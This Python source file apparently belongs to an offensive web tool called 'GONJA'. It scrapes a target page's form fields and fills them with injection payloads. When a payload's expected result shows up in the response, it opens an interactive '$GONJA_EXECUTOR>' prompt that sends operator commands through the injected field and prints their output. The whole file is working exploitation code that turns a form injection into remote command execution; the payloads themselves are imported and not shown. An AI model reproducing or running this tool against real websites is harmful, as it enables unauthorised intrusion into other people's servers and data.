from bs4 import BeautifulSoup
from requests.sessions import Session

from app.core.payloads.payload import Payload


class HttpClient:
    def __init__(self, url: str, payloads: list[Payload]):
        self.session = Session()
        self.url = url
        self.payloads = payloads

    def ident_request_by_method_get(self, *params: str):
        ...

    def ident_request_by_method_post_url_form(self):
        """
        Identify and get shell for SSRF in FORM
        """
        form_fields = self.__find_form_fields()
        for payload in self.payloads:
            form_data = {}
            for field in form_fields:
                form_data[field] = payload.base

            response = self.session.post(self.url, data=form_data)

            if payload.base_result in response.text:
                soup = BeautifulSoup(response.text, "lxml")
                shells = soup.find_all(lambda tag: tag.text == payload.base_result)
                for shell in shells:
                    while True:
                        cmd = input("$GONJA_EXECUTOR> ")
                        if cmd == "exit":
                            return
                        self._shell_post_url_form(shell.name, shell.get("class"), shell.get("id"), cmd, payload, *form_fields)

    def _shell_post_url_form(self, tag, _class, _id, command, payload: Payload, *form_fields: str):
        """
        :param tag: tag name where payload is located
        :param _class:  tag class where payload is located
        :param _id: tag id where payload is located
        :param command: command for execution
        :param payload: payload for execution
        :param form_fields: field for execution form
        :return:
        """
        execute_command = payload.execute(command=command)
        form_data = {}
        for field in form_fields:
            form_data[field] = execute_command

        response = self.session.post(self.url, data=form_data)
        soup = BeautifulSoup(response.text, "lxml")

        results = soup.find_all(class_=_class, id=_id, name=tag)
        for result in results:
            print(f"{result.text}\n")


    def __find_form_fields(self):
        """
        Find all form fields in payloads
        """
        response = self.session.get(self.url)

        soup = BeautifulSoup(response.text, "lxml")

        forms = soup.find_all(name="form")

        fields = []

        for form in forms:
            inputs = form.find_all(name="input")
            for input_tag in inputs:
                fields.append(input_tag.get("name"))


        return fields





